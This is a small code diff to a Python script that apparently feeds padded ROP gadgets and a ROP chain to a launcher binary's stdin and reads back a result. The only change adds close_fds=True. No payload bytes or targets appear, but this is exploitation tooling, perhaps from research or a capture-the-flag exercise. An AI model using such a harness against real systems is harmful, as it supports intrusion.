@@ -48,7 +48,7 @@ def main(argv):
                 "./launcher.elf",
                 #rootdir,
             ],
-            stdin=PIPE, stdout=PIPE)
+            stdin=PIPE, stdout=PIPE, close_fds=True)
         child.stdin.write(fill(gadgets, '\xCC', 4096))
         child.stdin.write(fill(ropchain, '\xFF', 4096))
         answer_word = child.stdout.read()
